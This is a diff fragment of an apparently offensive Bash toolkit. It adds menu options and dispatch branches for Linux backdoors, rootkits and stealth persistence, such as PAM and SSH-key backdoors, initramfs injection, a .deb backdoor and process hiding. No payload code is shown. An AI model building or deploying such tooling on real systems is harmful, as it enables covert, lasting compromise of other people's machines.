+                                  [14] PAM Backdoor
+                                  [15] SSH Authorized Keys Backdoor
+                                  [16] Logrotate Persistence
+                                  [17] Git Hooks Persistence
+                                  [18] XDG Autostart Persistence
+                                  [19] At Job Persistence
+                                  [20] DKMS Integration for LKM Rootkit
+                                  [21] Process Hiding via Bind Mount
+                                  [22] Hidepid /proc Mount
+                                  [23] Initramfs Injection (Ultra-Persistent)
+                                  [24] Package Manager Backdoor (.deb)
+                                  [25] Depmod Stealth (Hide from modules.dep)
+                                  [26] Namespace Jail (Container-Based Rootkit)
 
     [*] Coming soon others features [*]
 
@@ -329,6 +950,36 @@ EOF
         lkmRootkit
     elif [ "$MENUINPUT" == "11" ] || [ "$MENUINPUT" == "11" ]; then
         SetupLdPreloadPrivesc
+    elif [ "$MENUINPUT" == "12" ] || [ "$MENUINPUT" == "12" ]; then
+        udevPersistence
+    elif [ "$MENUINPUT" == "13" ] || [ "$MENUINPUT" == "13" ]; then
+        lkmPersistReboot
+    elif [ "$MENUINPUT" == "14" ] || [ "$MENUINPUT" == "14" ]; then
+        pamBackdoor
+    elif [ "$MENUINPUT" == "15" ] || [ "$MENUINPUT" == "15" ]; then
+        sshAuthkeysBackdoor
+    elif [ "$MENUINPUT" == "16" ] || [ "$MENUINPUT" == "16" ]; then
+        logrotatePersistence
+    elif [ "$MENUINPUT" == "17" ] || [ "$MENUINPUT" == "17" ]; then
+        githooksPersistence
+    elif [ "$MENUINPUT" == "18" ] || [ "$MENUINPUT" == "18" ]; then
+        xdgPersistence
+    elif [ "$MENUINPUT" == "19" ] || [ "$MENUINPUT" == "19" ]; then
+        atjobPersistence
+    elif [ "$MENUINPUT" == "20" ] || [ "$MENUINPUT" == "20" ]; then
+        dkmsRootkit
+    elif [ "$MENUINPUT" == "21" ] || [ "$MENUINPUT" == "21" ]; then
+        bindmountHide
+    elif [ "$MENUINPUT" == "22" ] || [ "$MENUINPUT" == "22" ]; then
+        hidepidProc
+    elif [ "$MENUINPUT" == "23" ] || [ "$MENUINPUT" == "23" ]; then
+        initramfsInject
+    elif [ "$MENUINPUT" == "24" ] || [ "$MENUINPUT" == "24" ]; then
+        debBackdoor
+    elif [ "$MENUINPUT" == "25" ] || [ "$MENUINPUT" == "25" ]; then
+        depmodStealth
+    elif [ "$MENUINPUT" == "26" ] || [ "$MENUINPUT" == "26" ]; then
+        namespaceJail
     else 
         echo "This option does not exist"
     fi
